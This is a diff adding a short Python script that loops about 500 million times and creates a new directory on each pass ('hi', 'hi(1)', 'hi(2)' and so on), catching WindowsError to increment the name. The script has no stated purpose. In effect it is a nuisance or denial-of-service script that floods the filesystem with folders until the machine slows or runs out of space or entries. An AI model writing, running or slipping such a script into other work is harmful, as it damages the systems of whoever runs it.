@@ -1,0 +1,18 @@
+import os
+loop = 0
+index = ''
+while loop <= 500000000:
+    while True:
+        try:
+            os.makedirs("hi"+index)
+            
+            break
+        except WindowsError:
+            if index:
+                index = '('+str(int(index[1:-1])+1)+')'
+                
+            else:
+                index = '(1)'
+            pass
+    
+    loop += 1
